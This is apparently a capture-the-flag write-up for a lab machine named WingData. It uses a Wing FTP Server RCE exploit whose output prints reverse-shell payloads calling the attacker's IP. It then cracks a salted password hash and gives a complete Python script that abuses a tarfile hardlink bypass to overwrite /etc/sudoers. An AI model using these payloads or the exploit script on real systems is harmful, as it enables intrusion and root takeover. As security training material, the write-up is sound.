

![[wingdata logo.png]]


# Enumeration

```
nmap -sVC -p- 10.129.10.84 -oN scan.txt
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-17 11:08 CET
Nmap scan report for 10.129.10.84
Host is up (0.029s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1fa958bd7560385e445c9c71eba283b (ECDSA)
|_  256 9cba211a972f3a6473c14c1dce657a2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.70 seconds
```

Only 2 ports, let's see port 80.
### Name resolution

We need to resolve the target name to access the web site

```
echo '10.129.10.84 wingdata.htb' | tee -a /etc/hosts
```

When we click on "login" we discover a subdomain of the target

```
echo '10.129.10.84 ftp.wingdata.htb' | tee -a /etc/hosts
```


![Pasted image 20260217111612](Image/Pasted%20image%2020260217111612.png)
The website show the version and the CMS used, so we can search for an exploit.

### Exploit

```
searchsploit Wing FTP Server 7.4.3
```

```
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)                  | multiple/remote/52347.py
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There is one, so we copy it to our directory

```
searchsploit -m multiple/remote/52347.py
```

And we test it

```
python3 exploit.py -u http://ftp.wingdata.htb/ -v

[*] Testing target: http://ftp.wingdata.htb/
[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with command: 'whoami' and username: 'anonymous'
[+] UID extracted: a90c1b942009c03d0c0976c34d7c66f3f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: a90c1b942009c03d0c0976c34d7c66f3f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
wingftp
----------------------
```

It worked, but i couldn't get a reverse shell with it so i found anoter one that allowed me to get a foothold on the target.

```
git clone https://github.com/0xcan1337/CVE-2025-47812-poC
cd
```

### Reverse shell

First we start a listener

```
nc -lvnp 443
```

Then we do the following to receive a reverse shell.

```
python3 CVE-2025-47812-poC.py                           ============================================================
   CVE-2025-47812 - Wing FTP Server RCE Exploit
============================================================
Target URL (e.g., http://localhost:5466): http://ftp.wingdata.htb/
Username (e.g., anonymous):
1) Run Command
2) Get Reverse Shell
Your choice (1 or 2): 2
Reverse shell IP address: 10.10.16.184
Reverse shell port: 443
[*] Trying payload: php -r '$sock=fsockopen("10.10.16.184",443);exec("sh <&3 >&3 2>&3");'
[*] Trying to get UID... Payload: php -r '$sock=fsockopen("10.10.16.184",443);exec("sh <&3 >&3 2>&3");'
[+] UID obtained: 32230aa3be496c508ddb6d5eade51614f528764d624db129b32c21fbca0cb8d6
[*] Sending /dir.html request...
[+] HTTP 200
------ Response Start ------
session expired

------ Response End ------
[*] Payload sent, waiting for reverse shell...
[*] Trying payload: bash -i >& /dev/tcp/10.10.16.184/443 0>&1
[*] Trying to get UID... Payload: bash -i >& /dev/tcp/10.10.16.184/443 0>&1
[+] UID obtained: 54553f8493e36a5b10996a5a66ca0702f528764d624db129b32c21fbca0cb8d6
[*] Sending /dir.html request...
[+] HTTP 200
------ Response Start ------
session expired

------ Response End ------
[*] Payload sent, waiting for reverse shell...
[*] Trying payload: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.184",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
[*] Trying to get UID... Payload: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.184",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
[+] UID obtained: 417ca8d938f113d2a1117d36e8f71077f528764d624db129b32c21fbca0cb8d6
[*] Sending /dir.html request...
[+] HTTP 200
------ Response Start ------
session expired

------ Response End ------
[*] Payload sent, waiting for reverse shell...
[*] Trying payload: nc 10.10.16.184 443 -e /bin/sh
[*] Trying to get UID... Payload: nc 10.10.16.184 443 -e /bin/sh
[+] UID obtained: 4e86b8242f9a596e294d23aac87c4289f528764d624db129b32c21fbca0cb8d6
[*] Sending /dir.html request...
```

We should have a connection back on our listener.
I stabilized it then i went to enumerate the target.
# Pivot

First i looked for users on the target by going to the /home directory

```
wingftp§wingdata:/opt/wftpserver/Data/1/users$ cd /home
wingftp§wingdata:/home$ ls
wacky
wingftp§wingdata:/home$ cd wacky/
bash: cd: wacky/: Permission denied
```

But permission was denied, so i had to find something else. I went back the the application's files because maybe i could find some credentials.

```
wingftp§wingdata:/opt/wftpserver/Data/1$ cd users/
wingftp§wingdata:/opt/wftpserver/Data/1/users$ ls
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
wingftp§wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
<SNIP>
```
 
 I discovered an hash for the user on the target, but i couldn't crack it because it was probably salted. 
 And i found the salt in the settings.xml file.
 
```
wingftp§wingdata:/opt/wftpserver/Data/1$ cat settings.xml
<SNIP>
    <EnablePasswordSalting>1</EnablePasswordSalting>
    <SaltingString>WingFTP</SaltingString>
<SNIP>
```

So now i need to crack wacky's password.
### Crack password

I putted the hash+salt into a file

```
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hash.txt
```

Then i used hashcat to crack it

```
hashcat hash.txt -m 1410 `fzf-wordlists`
<SNIP>

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
Time.Started.....: Tue Feb 17 12:07:43 2026 (2 secs)
Time.Estimated...: Tue Feb 17 12:07:45 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/lists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9745.2 kH/s (0.45ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14336000/14344384 (99.94%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[2321676f7468] -> $HEX[042a0337c2a156616d6f732103]

Started: Tue Feb 17 12:07:36 2026
Stopped: Tue Feb 17 12:07:48 2026
```

The password has been cracked, let's try the combo via ssh

```
ssh wacky@10.129.10.98
!#7Blushing^*Bride5
 
wacky@wingdata:~$
```

# Privesc

After grabbing user.txt, i need to find a way to root.

```
sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Looks like i can run a python script, let's see what it contains

```
cat /opt/backup_clients/restore_backup_clients.py
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

After reviewing the script, it looks like it use the attibrute `filter="date=` which is vulnerable to our current version of python3. The target should be vulnerable to **CVE-2025-4517**.

The vulnerability resides in how the `tarfile` module's `data` filter validates extraction paths. 

While the filter correctly blocks direct path traversal (e.g., `../../`) and symbolic links pointing outside the destination, it fails to properly resolve **Hardlinks** that reference **Symbolic Links** within the archive.

We can create a python script to exploit the vulnerability, and add our user to `/etc/sudoers`

```
nano exploit.py
```

```
#!/usr/bin/env python3
import tarfile
import io
import os

# Configuration
username = "wacky"
output_filename = "backup_v2.tar"

# Le contenu malveillant
payload_content = f"{username} ALL=(ALL) NOPASSWD: ALL\n".encode('utf-8')

print(f"[+] Construction de l'archive {output_filename} avec la méthode Hardlink Bypass...")

with tarfile.open(output_filename, "w") as tar:
    # --- PHASE 1 : La Confusion (Boucles de liens) ---
    # Cette structure est spécifique pour perdre le validateur
    comp = 'd' * 247  # Dossier au nom très long
    steps = "abcdefghijklmnop" # 16 niveaux
    path = ""
    
    print("[*] Phase 1: Création du labyrinthe de boucles...")
    for i in steps:
        # 1. Création du dossier long
        d = tarfile.TarInfo(os.path.join(path, comp))
        d.type = tarfile.DIRTYPE
        tar.addfile(d)
        
        # 2. Création d'un lien court qui pointe vers le dossier long (La Boucle)
        # C'est ce qui différencie ce script du précédent
        l = tarfile.TarInfo(os.path.join(path, i))
        l.type = tarfile.SYMTYPE
        l.linkname = comp
        tar.addfile(l)
        
        # On descend dans la structure
        path = os.path.join(path, comp)

    # --- PHASE 2 : La Remontée (Chain) ---
    print("[*] Phase 2: Création de la chaîne de remontée...")
    # On crée un chemin profond basé sur les étapes précédentes
    linkpath = os.path.join("/".join(steps), "l" * 254)
    
    chain = tarfile.TarInfo(linkpath)
    chain.type = tarfile.SYMTYPE
    # On remonte de 16 niveaux (len(steps))
    chain.linkname = "../" * len(steps)
    tar.addfile(chain)

    # --- PHASE 3 : L'Évasion vers /etc ---
    print("[*] Phase 3: Création du lien 'escape' vers /etc...")
    escape = tarfile.TarInfo("escape")
    escape.type = tarfile.SYMTYPE
    # On passe par notre chaîne de remontée 'linkpath' pour atteindre la racine, puis /etc
    escape.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(escape)

    # --- PHASE 4 : Le Hardlink (La clé du succès !) ---
    print("[*] Phase 4: Création du Hardlink vers sudoers...")
    # Au lieu d'écrire directement dans escape/sudoers, on crée un lien en dur
    hl = tarfile.TarInfo("sudoers_link")
    hl.type = tarfile.LNKTYPE  # C'est un Hardlink !
    hl.linkname = "escape/sudoers" # Il pointe vers notre cible via le lien escape
    tar.addfile(hl)

    # --- PHASE 5 : L'Écriture ---
    print("[*] Phase 5: Écriture du contenu...")
    # On écrit le contenu dans l'inode du Hardlink
    # Le fichier s'appelle "sudoers_link" dans l'archive, mais il modifiera la cible du lien
    target = tarfile.TarInfo("sudoers_link")
    target.type = tarfile.REGTYPE
    target.size = len(payload_content)
    target.mode = 0o440 # Permissions strictes
    tar.addfile(target, fileobj=io.BytesIO(payload_content))

print(f"[+] Terminé. {output_filename} généré.")
```

Then we move the file to `/opt/backup_clients/backups/`.

```
mv backup_123.tar /opt/backup_clients/backups/
```

Then we have to create file that will serve as argument.

```
mkdir /tmp/pwn_execution
cd /tmp/pwn_execution
```

```
touch -- -bbackup_123.tar
touch -- -rrestore_pwn
```

Then we can run the command as sudo

```
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py * -b backup_123.tar -r restore_pwn
[+] Backup: backup_123.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn
```

The exploit succesfully worked, we check our rights with sudo to be sure

```
sudo -l
User wacky may run the following commands on wingdata:
    (ALL) NOPASSWD: ALL
```

We can now change our user to sudo

```
sudo su
cd /root
cat root.txt
```